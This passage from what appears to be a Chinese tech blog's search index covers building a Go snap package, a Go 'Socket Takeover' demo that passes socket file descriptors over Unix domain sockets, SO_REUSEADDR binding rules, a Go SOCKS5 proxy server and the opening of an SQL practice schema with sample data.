15 16 17 # 1. 安装 snap sudo apt install snapd snap version output: snap 2.53+21.10ubuntu1 snapd 2.53+21.10ubuntu1 series 16 ubuntu 21.10 kernel 5.13.0-22-generic # 2. 安装 snapcraft sudo snap install --classic snapcraft snapcraft version output: snapcraft, version 6.0 三、初始化 snacraft 项目 1 2 3 4 5 6 7 8 9 10 11 12 # 1. 创建目录 mkdir gosnap cd gosnap mkdir hello cd snap # 2. 初始化项目 snapcraft init # 当前目录如下: . └── snap └── snapcraft.yaml snapcraft.yaml文件就是我们构建项目时需要使用的配置文件：\n1 2 3 4 5 6 7 8 9 10 11 12 name: my-snap-name # you probably want to \u0026#39;snapcraft register \u0026lt;name\u0026gt;\u0026#39; base: core18 # the base snap is the execution environment for this snap version: \u0026#39;0.1\u0026#39; # just for humans, typically \u0026#39;1.2+git\u0026#39; or \u0026#39;1.3.2\u0026#39; summary: Single-line elevator pitch for your amazing snap # 79 char long summary description: | This is my-snap\u0026#39;s description. You have a paragraph or two to tell the most important story about your snap. Keep it under 100 words though, we live in tweetspace and your description wants to look good in the snap store. grade: devel # must be \u0026#39;stable\u0026#39; to release into candidate/stable channels confinement: devmode # use \u0026#39;strict\u0026#39; once you have the right plugs and slots 关于这个配置文件的更多信息可以查看官方手册：Snapcraft.yaml reference | Snapcraft documentation\n四、创建 Go 项目 1 2 3 4 5 6 7 # 1. 创建文件夹 mkdir src cd src # 2. 创建 go 项目 go mod init gohello vim main.hello 输入以下代码：\n1 2 3 4 5 6 7 package main import \u0026#34;fmt\u0026#34; func main() { fmt.Println(\u0026#34;hello world\u0026#34;) } 当前项目文件如下：\n. └── hello └── snap ├── snapcraft.yaml └── src ├── go.mod └── main.go 五、修改配置文件 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 name: gohello base: core20 version: \u0026#39;0.1\u0026#39; summary: Hello World! description: | This is my-snap\u0026#39;s description. grade: devel confinement: devmode parts: my-part: source: src/ plugin: go apps: gohello: command: bin/gohello 六、构建 snap 应用 1 2 3 4 5 6 7 8 cd snap ls output: snapcraft.yaml src # 开始构建 snapcraft 第一次构建的时候会出现选择使用 multipass，输入 y。\n紧接着就会开始进行构建：\nSnapcraft is running in directory \u0026#39;snap\u0026#39;. If this is the snap assets directory, please run snapcraft from /root/gosnap/hello. Launching a VM. ....... 构建过程十分缓慢，构建完成后则会在当前文件夹下出现一个 gohello_0.1_amd64.snap 文件。\n七、安装 snap 应用 1 2 3 4 sudo snap install --devmode gohello_0.1_amd64.snap output: gohello 0.1 installed 执行应用：\n1 2 3 4 gohello output: hello world 至此我们的snap应用就已经构建安装完毕。\n八、问题总结 1. multipass 问题 当构建过程中遇到 multipass 问题时，如这种：\nAn error occurred with the instance when trying to launch with \u0026#39;multipass\u0026#39;: returned exit code 2. Ensure that \u0026#39;multipass\u0026#39; is setup correctly and try again. 可以选择重启 multipass 服务，再重新构建：\n1 sudo systemctl restart snapd.multipass.multipassd.service ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/snap-%E5%BA%94%E7%94%A8%E6%9E%84%E5%BB%BA%E5%85%A5%E9%97%A8go-%E8%AF%AD%E8%A8%80/","title":"snap 应用构建入门(Go 语言)"},{"content":"Socket Takeover 在 Meta 的《Zero Downtime Release:Disruption-free Load Balancing of a Multi-Billion User Website》论文中提到了一种 Socket Takeover 技术，\n该技术能够 将一个打开的 Socket FD 从旧进程传递到新进程。\n相关技术 file descriptor 要理解这项技术，首先要明白 Linux 的 file descriptor。file descriptor （简称 fd）是一个抽象的指示符，以一个非负整数来表示。fd 和底层文件系统中的文件进行绑定，fd 只在打开文件的进程有效。\n如果把 fd 当作一个普通的值传递给其他进程用于打开，其他进程是无法使用这个 fd 的。\nUnix domain socket Unix domain socket（简称 uds）是在 unix 环境下的一种特殊的 socket。uds 地址采用路径名的形式。与网络套接字不同，跨 Unix 域套接字的 I/O 不涉及底层设备上的操作（这使得 Unix 域套接字比在同一主机上执行 IPC 的网络套接字要快得多）。\nuds 在传输数据时，除了能够像普通的 socket 那样传输数据，还能够进行特殊的 辅助数据传输（Ancillary Data Transfer ）。\n在 Linux 上可以进行三种类型的辅助数据传输：\nSCM_RIGHTS SCM_CREDENTIALS SCM_SECURITY 在实现 Socket Takeover 时就需要使用到 SCM_RIGHTS。\nSCM_RIGHTS 能够在不同进程之间传递 file descriptor（更准确来说是传递的文件所有权，类似于父子进程之间能够共享文件）。\n实现 下面是用 Go 实现的 Socket Takeover demo，该demo中包含三个模块：client（TCP 客户端）、server（TCP server）和forward（UDS Server）。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 // client.go package main import ( \u0026#34;fmt\u0026#34; \u0026#34;log\u0026#34; \u0026#34;net\u0026#34; ) func main() { addr, err := net.ResolveTCPAddr(\u0026#34;tcp\u0026#34;, \u0026#34;127.0.0.1:8080\u0026#34;) if err != nil { log.Fatal(err) } for i := 0; i \u0026lt; 20; i++ { conn, err := net.DialTCP(\u0026#34;tcp\u0026#34;, nil, addr) if err != nil { return } conn.Write([]byte(fmt.Sprintf(\u0026#34;seq num %d\u0026#34;, i))) buff := make([]byte, 1024) n, err := conn.Read(buff) if err != nil { log.Fatal(err) } log.Printf(\u0026#34;recv data: %s\\n\u0026#34;, buff[:n]) conn.Close() } } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 // server.go package main import ( \u0026#34;log\u0026#34; \u0026#34;net\u0026#34; \u0026#34;syscall\u0026#34; ) const ( forwardSocket = \u0026#34;/tmp/forward_demo.sock\u0026#34; ) func main() { addr, err := net.ResolveTCPAddr(\u0026#34;tcp\u0026#34;, \u0026#34;127.0.0.1:8080\u0026#34;) if err != nil { log.Fatal(err) } tcp, err := net.ListenTCP(\u0026#34;tcp\u0026#34;, addr) if err != nil { log.Fatal(err) } for { conn, err := tcp.AcceptTCP() if err != nil { log.Fatal(err) } handle(conn) } } func handle(conn *net.TCPConn) { defer conn.Close() err := forwardConn(conn) if err != nil { log.Printf(\u0026#34;fail to forward conn: %v\u0026#34;, err) buff := make([]byte, 1024) n, err := conn.Read(buff) if err != nil { log.Fatal(err) } log.Printf(\u0026#34;recv data: %s\\n\u0026#34;, buff[:n]) conn.Write([]byte(\u0026#34;process by server\u0026#34;)) } } func forwardConn(conn *net.TCPConn) error { addr := \u0026amp;net.UnixAddr{ Name: forwardSocket, Net: \u0026#34;unix\u0026#34;, } unixConn, err := net.DialUnix(\u0026#34;unix\u0026#34;, nil, addr) if err != nil { return err } defer unixConn.Close() file, err := conn.File() if err != nil { return err } datan, oobn, err := unixConn.WriteMsgUnix([]byte(\u0026#34;forward\u0026#34;), syscall.UnixRights(int(file.Fd())), nil) if err != nil { return err } log.Printf(\u0026#34;%d bytes and %d oob written successfully\u0026#34;, datan, oobn) return nil } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 // forward.go package main import ( \u0026#34;errors\u0026#34; \u0026#34;fmt\u0026#34; \u0026#34;log\u0026#34; \u0026#34;net\u0026#34; \u0026#34;os\u0026#34; \u0026#34;syscall\u0026#34; ) const ( forwardSocket = \u0026#34;/tmp/forward_demo.sock\u0026#34; ) func main() { syscall.Unlink(forwardSocket) unixListener, err := net.ListenUnix(\u0026#34;unix\u0026#34;, \u0026amp;net.UnixAddr{Name: forwardSocket, Net: \u0026#34;unix\u0026#34;}) if err != nil { panic(err) } for { unixConn, err := unixListener.AcceptUnix() if err != nil { panic(err) } tcp, err := unixToTCP(unixConn) if err != nil { panic(err) } buff := make([]byte, 1024) n, err := tcp.Read(buff) if err != nil { panic(err) } log.Printf(\u0026#34;tcp %s -\u0026gt; %s: %s\u0026#34;, tcp.LocalAddr(), tcp.RemoteAddr(), buff[:n]) tcp.Write([]byte(\u0026#34;process by forward\u0026#34;)) tcp.Close() } } func unixToTCP(conn *net.UnixConn) (*net.TCPConn, error) { msg, oob := make([]byte, 128), make([]byte, 128) msgn, oobn, flag, addr, err := conn.ReadMsgUnix(msg, oob) if err != nil { return nil, err } log.Println(msgn, oobn, flag, addr) log.Printf(\u0026#34;recv msg: %s\u0026#34;, msg[:msgn]) cmsgs, err := syscall.ParseSocketControlMessage(oob[0:oobn]) if err != nil { return nil, err } if len(cmsgs) != 1 { return nil, fmt.Errorf(\u0026#34;expected 1 control message; got %d\u0026#34;, len(cmsgs)) } fds, err := syscall.ParseUnixRights(\u0026amp;cmsgs[0]) if err != nil { return nil, err } else if len(fds) != 1 { return nil, errors.New(\u0026#34;invalid number of fds received\u0026#34;) } fd := os.NewFile(uintptr(fds[0]), \u0026#34;\u0026#34;) if fd == nil { return nil, errors.New(\u0026#34;could not open fd\u0026#34;) } fileConn, err := net.FileConn(fd) if err != nil { return nil, err } return fileConn.(*net.TCPConn), nil } ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/socket-takeover/","title":"Socket Takeover"},{"content":"socket 地址和端口复用 socket 概念 TCP/UDP socket 是由以下五元组唯一地识别的：\n1 {\u0026lt;protocol\u0026gt;, \u0026lt;src addr\u0026gt;, \u0026lt;src port\u0026gt;, \u0026lt;dest addr\u0026gt;, \u0026lt;dest port\u0026gt;} 对于任意连接，五元组组成不能完全相同。否则操作系统无法区别这些连接。\nsocket 的协议是在用 socket() 初始化的时候就设置好的。\n源地址（source address）和源端口（source port）是在调用 bind() 的时候设置。\n目的地址（destination address）和目的端口（destination port）是在调用 connect() 的时候设置。\n其中 UDP 是无连接的，UDP socket 可以在未与目的端口连接的情况下使用。但 UDP 也可以在某些情况下先与目的地址和端口建立连接后使用。在使用无连接 UDP 发送数据的情况下，如果没有显式地调用bind()，操作系统会在第一次发送数据时自动将 UDP socket 与本机的地址和某个端口绑定（否则的话程序无法接受任何远程主机回复的数据）。同样的，一个没有绑定地址的 TCP socket 也会在建立连接时被自动绑定一个本机地址和端口。\n如果我们手动绑定一个端口，我们可以将socket绑定至端口0，绑定至端口0的意思是让系统自己决定使用哪个端口（一般是从一组操作系统特定的提前决定的端口数范围中），所以也就是任何端口的意思。同样的，我们也可以使用一个通配符来让系统决定绑定哪个源地址（ipv4通配符为0.0.0.0，ipv6通配符为::）。而与端口不同的是，一个socket可以被绑定到主机上所有接口所对应的地址中的任意一个。基于连接在本socket的目的地址和路由表中对应的信息，操作系统将会选择合适的地址来绑定这个socket，并用这个地址来取代之前的通配符IP地址。\n在默认情况下，任意两个socket不能被绑定在同一个源地址和源端口组合上。比如说我们将 socketA 绑定在 A:X 地址，将 socketB 绑定在 B:Y 地址，其中A和B是IP地址，X和Y是端口。那么在A==B的情况下X!=Y必须满足，在X==Y的情况下A!=B必须满足。需要注意的是，如果某一个socket被绑定在通配符IP地址下，那么事实上本机所有IP都会被系统认为与其绑定了。例如一个socket绑定了0.0.0.0:21，在这种情况下，任何其他socket不论选择哪一个具体的IP地址，其都不能再绑定在21端口下。因为通配符IP0.0.0.0与所有本地IP都冲突。\nSO_REUSEADDR 如果在一个socket绑定到某一地址和端口之前设置了其SO_REUSEADDR的属性，那么除非本socket与产生了尝试与另一个socket绑定到完全相同的源地址和源端口组合的冲突，否则的话这个socket就可以成功的绑定这个地址端口对。这听起来似乎和之前一样。但是其中的关键字是完全。SO_REUSEADDR主要改变了系统对待通配符IP地址冲突的方式。\n如果不用SO_REUSEADDR的话，如果我们将socketA绑定到0.0.0.0:21，那么任何将本机其他socket绑定到端口21的举动（如绑定到192.168.1.1:21）都会导致EADDRINUSE错误。因为0.0.0.0是一个通配符IP地址，意味着任意一个IP地址，所以任何其他本机上的IP地址都被系统认为已被占用。如果设置了SO_REUSEADDR选项，因为0.0.0.0:21和192.168.1.1:21并不是完全相同的地址端口对（其中一个是通配符IP地址，另一个是一个本机的具体IP地址），所以这样的绑定是可以成功的。需要注意的是，无论socketA和socketB初始化的顺序如何，只要设置了SO_REUSEADDR，绑定都会成功；而只要没有设置SO_REUSEADDR，绑定都不会成功。\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/socket-%E5%9C%B0%E5%9D%80%E5%92%8C%E7%AB%AF%E5%8F%A3%E5%A4%8D%E7%94%A8/","title":"socket 地址和端口复用"},{"content":"Socks5 代理 SOCKS是一种网络传输协议，名字取自 SOCKetS，主要用于客户端与外网服务器之间通讯的中间传递。\nSocks5 是 Socks 协议的第五个版本，在 Socks4 的基础上增加了 UDP 转发和认证功能。\nSocks 的流程为：\n实现代码 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 227 228 229 230 231 232 233 234 235 236 237 238 239 240 241 242 243 244 245 246 247 248 249 250 251 252 253 254 255 256 257 258 259 260 261 262 263 264 265 266 267 268 269 270 271 272 273 274 275 276 277 278 279 280 281 282 283 284 285 286 287 288 289 290 291 292 293 294 295 296 297 298 299 300 301 302 303 304 305 306 307 308 309 310 311 312 313 314 315 316 317 318 319 320 321 322 323 324 325 326 327 328 329 330 331 332 333 334 335 336 337 338 339 340 341 342 343 344 345 346 347 348 349 350 351 352 353 354 355 356 357 358 359 360 361 362 363 364 365 366 367 368 369 370 371 372 373 374 375 376 377 378 379 380 381 382 383 384 385 386 387 388 389 390 391 392 393 394 395 396 397 398 399 400 401 402 403 404 405 package socks5 import ( \u0026#34;context\u0026#34; \u0026#34;encoding/binary\u0026#34; \u0026#34;fmt\u0026#34; \u0026#34;io\u0026#34; \u0026#34;net\u0026#34; \u0026#34;strconv\u0026#34; \u0026#34;time\u0026#34; \u0026#34;github.com/gogf/gf/v2/os/glog\u0026#34; ) // Authentication METHODs described in RFC 1928, section 3. const ( noAuthRequired byte = 0 passwordAuth byte = 2 noAcceptableAuth byte = 255 ) // passwordAuthVersion is the auth version byte described in RFC 1929. const passwordAuthVersion = 1 // socks5Version is the byte that represents the SOCKS version // in requests. const socks5Version byte = 5 // commandType are the bytes sent in SOCKS5 packets // that represent the kind of connection the client needs. type commandType byte // The set of valid SOCKS5 commands as described in RFC 1928. const ( connect commandType = 1 bind commandType = 2 udpAssociate commandType = 3 ) // addrType are the bytes sent in SOCKS5 packets // that represent particular address types. type addrType byte // The set of valid SOCKS5 address types as defined in RFC 1928. const ( ipv4 addrType = 1 domainName addrType = 3 ipv6 addrType = 4 ) // replyCode are the bytes sent in SOCKS5 packets // that represent replies from the server to a client // request. type replyCode byte // The set of valid SOCKS5 reply types as per the RFC 1928. const ( success replyCode = 0 generalFailure replyCode = 1 connectionNotAllowed replyCode = 2 networkUnreachable replyCode = 3 hostUnreachable replyCode = 4 connectionRefused replyCode = 5 ttlExpired replyCode = 6 commandNotSupported replyCode = 7 addrTypeNotSupported replyCode = 8 ) // Server is a SOCKS5 proxy server. type Server struct { ctx context.Context // Logf optionally specifies the logger to use. // If nil, the standard logger is used. Logf *glog.Logger // Dialer optionally specifies the dialer to use for outgoing connections. // If nil, the net package\u0026#39;s standard dialer is used. Dialer func(ctx context.Context, network, addr string) (net.Conn, error) // Username and Password, if set, are the credential clients must provide. Username string Password string } func (s *Server) dial(ctx context.Context, network, addr string) (net.Conn, error) { dial := s.Dialer if dial == nil { dialer := \u0026amp;net.Dialer{} dial = dialer.DialContext } return dial(ctx, network, addr) } func (s *Server) logf(format string, args ...any) { if s.Logf == nil { s.Logf = glog.New() s.Logf.SetFlags(glog.F_TIME_STD | glog.F_FILE_SHORT) } s.Logf.Infof(s.ctx, format, args...) } // Serve accepts and handles incoming connections on the given listener. func (s *Server) Serve(l net.Listener) error { defer l.Close() for { c, err := l.Accept() if err != nil { return err } go func() { defer c.Close() conn := \u0026amp;Conn{clientConn: c, srv: s} err := conn.Run() if err != nil { s.logf(\u0026#34;client connection failed: %v\u0026#34;, err) } }() } } // Conn is a SOCKS5 connection for client to reach // server. type Conn struct { // The struct is filled by each of the internal // methods in turn as the transaction progresses. srv *Server clientConn net.Conn request *request } // Run starts the new connection. func (c *Conn) Run() error { needAuth := c.srv.Username != \u0026#34;\u0026#34; || c.srv.Password != \u0026#34;\u0026#34; authMethod := noAuthRequired if needAuth { authMethod = passwordAuth } err := parseClientGreeting(c.clientConn, authMethod) if err != nil { c.clientConn.Write([]byte{socks5Version, noAcceptableAuth}) return err } c.clientConn.Write([]byte{socks5Version, authMethod}) if !needAuth { return c.handleRequest() } user, pwd, err := parseClientAuth(c.clientConn) if err != nil || user != c.srv.Username || pwd != c.srv.Password { c.clientConn.Write([]byte{1, 1}) // auth error return err } c.clientConn.Write([]byte{1, 0}) // auth success return c.handleRequest() } func (c *Conn) handleRequest() error { req, err := parseClientRequest(c.clientConn) if err != nil { res := \u0026amp;response{reply: generalFailure} buf, _ := res.marshal() c.clientConn.Write(buf) return err } if req.command != connect { res := \u0026amp;response{reply: commandNotSupported} buf, _ := res.marshal() c.clientConn.Write(buf) return fmt.Errorf(\u0026#34;unsupported command %v\u0026#34;, req.command) } c.request = req ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second) defer cancel() srv, err := c.srv.dial( ctx, \u0026#34;tcp\u0026#34;, net.JoinHostPort(c.request.destination, strconv.Itoa(int(c.request.port))), ) if err != nil { res := \u0026amp;response{reply: generalFailure} buf, _ := res.marshal() c.clientConn.Write(buf) return err } defer srv.Close() serverAddr, serverPortStr, err := net.SplitHostPort(srv.LocalAddr().String()) if err != nil { return err } serverPort, _ := strconv.Atoi(serverPortStr) var bindAddrType addrType if ip := net.ParseIP(serverAddr); ip != nil { if ip.To4() != nil { bindAddrType = ipv4 } else { bindAddrType = ipv6 } } else { bindAddrType = domainName } res := \u0026amp;response{ reply: success, bindAddrType: bindAddrType, bindAddr: serverAddr, bindPort: uint16(serverPort), } buf, err := res.marshal() if err != nil { res = \u0026amp;response{reply: generalFailure} buf, _ = res.marshal() } c.clientConn.Write(buf) errc := make(chan error, 2) go func() { _, err := io.Copy(c.clientConn, srv) if err != nil { err = fmt.Errorf(\u0026#34;from backend to client: %w\u0026#34;, err) } errc \u0026lt;- err }() go func() { _, err := io.Copy(srv, c.clientConn) if err != nil { err = fmt.Errorf(\u0026#34;from client to backend: %w\u0026#34;, err) } errc \u0026lt;- err }() return \u0026lt;-errc } // parseClientGreeting parses a request initiation packet. func parseClientGreeting(r io.Reader, authMethod byte) error { var hdr [2]byte _, err := io.ReadFull(r, hdr[:]) if err != nil { return fmt.Errorf(\u0026#34;could not read packet header\u0026#34;) } if hdr[0] != socks5Version { return fmt.Errorf(\u0026#34;incompatible SOCKS version\u0026#34;) } count := int(hdr[1]) methods := make([]byte, count) _, err = io.ReadFull(r, methods) if err != nil { return fmt.Errorf(\u0026#34;could not read methods\u0026#34;) } for _, m := range methods { if m == authMethod { return nil } } return fmt.Errorf(\u0026#34;no acceptable auth methods\u0026#34;) } func parseClientAuth(r io.Reader) (usr, pwd string, err error) { var hdr [2]byte if _, err := io.ReadFull(r, hdr[:]); err != nil { return \u0026#34;\u0026#34;, \u0026#34;\u0026#34;, fmt.Errorf(\u0026#34;could not read auth packet header\u0026#34;) } if hdr[0] != passwordAuthVersion { return \u0026#34;\u0026#34;, \u0026#34;\u0026#34;, fmt.Errorf(\u0026#34;bad SOCKS auth version\u0026#34;) } usrLen := int(hdr[1]) usrBytes := make([]byte, usrLen) if _, err := io.ReadFull(r, usrBytes); err != nil { return \u0026#34;\u0026#34;, \u0026#34;\u0026#34;, fmt.Errorf(\u0026#34;could not read auth packet username\u0026#34;) } var hdrPwd [1]byte if _, err := io.ReadFull(r, hdrPwd[:]); err != nil { return \u0026#34;\u0026#34;, \u0026#34;\u0026#34;, fmt.Errorf(\u0026#34;could not read auth packet password length\u0026#34;) } pwdLen := int(hdrPwd[0]) pwdBytes := make([]byte, pwdLen) if _, err := io.ReadFull(r, pwdBytes); err != nil { return \u0026#34;\u0026#34;, \u0026#34;\u0026#34;, fmt.Errorf(\u0026#34;could not read auth packet password\u0026#34;) } return string(usrBytes), string(pwdBytes), nil } // request represents data contained within a SOCKS5 // connection request packet. type request struct { command commandType destination string port uint16 destAddrType addrType } // parseClientRequest converts raw packet bytes into a // SOCKS5Request struct. func parseClientRequest(r io.Reader) (*request, error) { var hdr [4]byte _, err := io.ReadFull(r, hdr[:]) if err != nil { return nil, fmt.Errorf(\u0026#34;could not read packet header\u0026#34;) } cmd := hdr[1] destAddrType := addrType(hdr[3]) var destination string var port uint16 if destAddrType == ipv4 { var ip [4]byte _, err = io.ReadFull(r, ip[:]) if err != nil { return nil, fmt.Errorf(\u0026#34;could not read IPv4 address\u0026#34;) } destination = net.IP(ip[:]).String() } else if destAddrType == domainName { var dstSizeByte [1]byte _, err = io.ReadFull(r, dstSizeByte[:]) if err != nil { return nil, fmt.Errorf(\u0026#34;could not read domain name size\u0026#34;) } dstSize := int(dstSizeByte[0]) domainName := make([]byte, dstSize) _, err = io.ReadFull(r, domainName) if err != nil { return nil, fmt.Errorf(\u0026#34;could not read domain name\u0026#34;) } destination = string(domainName) } else if destAddrType == ipv6 { var ip [16]byte _, err = io.ReadFull(r, ip[:]) if err != nil { return nil, fmt.Errorf(\u0026#34;could not read IPv6 address\u0026#34;) } destination = net.IP(ip[:]).String() } else { return nil, fmt.Errorf(\u0026#34;unsupported address type\u0026#34;) } var portBytes [2]byte _, err = io.ReadFull(r, portBytes[:]) if err != nil { return nil, fmt.Errorf(\u0026#34;could not read port\u0026#34;) } port = binary.BigEndian.Uint16(portBytes[:]) return \u0026amp;request{ command: commandType(cmd), destination: destination, port: port, destAddrType: destAddrType, }, nil } // response contains the contents of // a response packet sent from the proxy // to the client. type response struct { reply replyCode bindAddrType addrType bindAddr string bindPort uint16 } // marshal converts a SOCKS5Response struct into // a packet. If res.reply == Success, it may throw an error on // receiving an invalid bind address. Otherwise, it will not throw. func (res *response) marshal() ([]byte, error) { pkt := make([]byte, 4) pkt[0] = socks5Version pkt[1] = byte(res.reply) pkt[2] = 0 // null reserved byte pkt[3] = byte(res.bindAddrType) if res.reply != success { return pkt, nil } var addr []byte switch res.bindAddrType { case ipv4: addr = net.ParseIP(res.bindAddr).To4() if addr == nil { return nil, fmt.Errorf(\u0026#34;invalid IPv4 address for binding\u0026#34;) } case domainName: if len(res.bindAddr) \u0026gt; 255 { return nil, fmt.Errorf(\u0026#34;invalid domain name for binding\u0026#34;) } addr = make([]byte, 0, len(res.bindAddr)+1) addr = append(addr, byte(len(res.bindAddr))) addr = append(addr, []byte(res.bindAddr)...) case ipv6: addr = net.ParseIP(res.bindAddr).To16() if addr == nil { return nil, fmt.Errorf(\u0026#34;invalid IPv6 address for binding\u0026#34;) } default: return nil, fmt.Errorf(\u0026#34;unsupported address type\u0026#34;) } pkt = append(pkt, addr...) pkt = binary.BigEndian.AppendUint16(pkt, uint16(res.bindPort)) return pkt, nil } ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/socks5-%E4%BB%A3%E7%90%86/","title":"Socks5 代理"},{"content":"SQL 经典 50 题 引言 SQL 是一门基础简单、语法通俗易懂的语言。但是想要灵活应用 SQL，使其能够达到随心所欲的境界就需要大量的练习。下面这50道问题是十分经典的题目，全部练习之后会使你的 SQL 语句编写能力更上一个台阶。加油吧！\n注：博主是使用的 MySQL8 练习的题目，大家自行练习时要注意和自己的数据库版本进行对应哦。\n创建数据库 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 DROP TABLE IF EXISTS `Course`; CREATE TABLE `Course` ( `C` varchar(10) CHARACTER SET utf8mb4 COLLATE utf8mb4_0900_ai_ci NULL DEFAULT NULL, `Cname` varchar(10) CHARACTER SET utf8mb4 COLLATE utf8mb4_0900_ai_ci NULL DEFAULT NULL, `T` varchar(10) CHARACTER SET utf8mb4 COLLATE utf8mb4_0900_ai_ci NULL DEFAULT NULL ) ENGINE = InnoDB CHARACTER SET = utf8mb4 COLLATE = utf8mb4_0900_ai_ci ROW_FORMAT = DYNAMIC; -- ---------------------------- -- Records of Course -- ---------------------------- INSERT INTO `Course` VALUES (\u0026#39;01\u0026#39;, \u0026#39;语文\u0026#39;, \u0026#39;02\u0026#39;); INSERT INTO `Course` VALUES (\u0026#39;02\u0026#39;, \u0026#39;数学\u0026#39;, \u0026#39;01\u0026#39;); INSERT INTO `Course` VALUES (\u0026#39;03\u0026#39;, \u0026#39;英语\u0026#39;, \u0026#39;03\u0026#39;); -- ---------------------------- -- Table structure for SC -- ---------------------------- DROP TABLE IF EXISTS `SC`; CREATE TABLE `SC` ( `S` varchar(10) CHARACTER SET utf8mb4 COLLATE utf8mb4_0900_ai_ci NULL DEFAULT NULL, `C` varchar(10) CHARACTER SET utf8mb4 COLLATE utf8mb4_0900_ai_ci NULL DEFAULT NULL, `score` decimal(18, 1) NULL DEFAULT NULL ) ENGINE = InnoDB CHARACTER SET = utf8mb4 COLLATE = utf8mb4_0900_ai_ci ROW_FORMAT = DYNAMIC; -- ---------------------------- -- Records of SC -- ---------------------------- INSERT INTO `SC` VALUES (\u0026#39;01\u0026#39;, \u0026#39;01\u0026#39;, 80.0); INSERT INTO `SC` VALUES (\u0026#39;01\u0026#39;, \u0026#39;02\u0026#39;, 90.0); INSERT INTO `SC` VALUES (\u0026#39;01\u0026#39;, \u0026#39;03\u0026#39;, 99.0); INSERT INTO `SC` VALUES (\u0026#39;02\u0026#39;, \u0026#39;01\u0026#39;, 70.0); INSERT INTO `SC` VALUES (\u0026#39;02\u0026#39;, \u0026#39;02\u0026#39;, 60.0); INSERT INTO `SC` VALUES (\u0026#39;02\u0026#39;, \u0026#39;03\u0026#39;, 80.0); INSERT INTO `SC` VALUES (\u0026#39;03\u0026#39;, \u0026#39;01\u0026#39;, 80.0); INSERT INTO `SC` VALUES (\u0026#39;03\u0026#39;, \u0026#39;02\u0026#39;, 80.0); INSERT INTO `SC` VALUES (\u0026#39;03\u0026#39;, \u0026#39;03\u0026#39;, 80.0); INSERT INTO `SC` VALUES (\u0026#39;04\u0026#39;, \u0026#39;01\u0026#39;, 50.0); INSERT INTO `SC` VALUES (\u0026#39;04\u0026#39;, \u0026#39;02\u0026#39;, 30.0); INSERT INTO `SC` VALUES (\u0026#39;04\u0026#39;, \u0026#39;03\u0026#39;, 20.0); INSERT INTO `SC` VALUES (\u0026#39;05\u0026#39;, \u0026#39;01\u0026#39;, 76.0); INSERT INTO `SC` VALUES (\u0026#39;05\u0026#39;, \u0026#39;02\u0026#39;, 87.0); INSERT INTO `SC` VALUES (\u0026#39;06\u0026#39;, \u0026#39;01\u0026#39;, 31.0); INSERT INTO `SC` VALUES (\u0026#39;06\u0026#39;, \u0026#39;03\u0026#39;, 34.0); INSERT INTO `SC` VALUES (\u0026#39;07\u0026#39;, \u0026#39;02\u0026#39;, 89.0); INSERT INTO `SC` VALUES (\u0026#39;07\u0026#39;, \u0026#39;03\u0026#39;, 98.0); INSERT INTO `SC` VALUES (\u0026#39;07\u0026#39;, \u0026#39;04\u0026#39;, 94.0); -- ---------------------------- -- Table structure for Student -- ---------------------------- DROP TABLE IF EXISTS `Student`; CREATE TABLE `Student` ( `S` varchar(10) CHARACTER SET utf8mb4 COLLATE utf8mb4_0900_ai_ci NULL DEFAULT NULL, `Sname` varchar(10) CHARACTER SET utf8mb4 COLLATE utf8mb4_0900_ai_ci NULL DEFAULT NULL, `Sage` datetime(0) NULL DEFAULT NULL, `Ssex` varchar(10) CHARACTER SET utf8mb4 COLLATE utf8mb4_0900_ai_ci NULL DEFAULT NULL ) ENGINE = InnoDB CHARACTER SET = utf8mb4 COLLATE = utf8mb4_0900_ai_ci ROW_FORMAT = DYNAMIC; -- ---------------------------- -- Records of Student -- ---------------------------- INSERT INTO `Student` VALUES (\u0026#39;01\u0026#39;, \u0026#39;赵雷\u0026#39;, \u0026#39;1990-01-01 00:00:00\u0026#39;, \u0026#39;男\u0026#39;); INSERT INTO `Student` VALUES (\u0026#39;02\u0026#39;, \u0026#39;钱电\u0026#39;, \u0026#39;1990-12-21 00:00:00\u0026#39;, \u0026#39;男\u0026#39;); INSERT INTO `Student` VALUES (\u0026#39;03\u0026#39;, \u0026#39;孙风\u0026#39;, \u0026#39;1990-05-20 00:00:00\u0026#39;, \u0026#39;男\u0026#39;); INSERT INTO `Student` VALUES 